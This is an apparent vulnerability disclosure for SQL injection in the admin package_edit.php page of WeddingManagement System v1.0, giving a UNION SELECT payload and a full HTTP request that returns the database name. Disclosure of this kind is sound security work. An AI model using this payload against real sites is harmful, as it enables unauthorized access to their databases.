# WeddingManagement System v1.0 by codeastr.com has SQL injection

vendors: https://codeastro.com/wedding-management-system-in-php-with-source-code/

Vulnerability File: \admin\package_edit.php

Vulnerability location: /Wedding-Management/admin/package_edit.php?id=, id

[+] Payload: id=-1%20union%20select%201,2,database(),4--+

dbname = dbwedding

```sql
GET /Wedding-Management/admin/package_edit.php?id=-1%20union%20select%201,2,database(),4--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/167984006-c5b3f6ba-21f9-4910-9b9e-fdee59b33096.png)

![image](https://user-images.githubusercontent.com/54017627/167984033-f27055c0-ebed-4e24-a33b-3d36ddcafb3c.png)

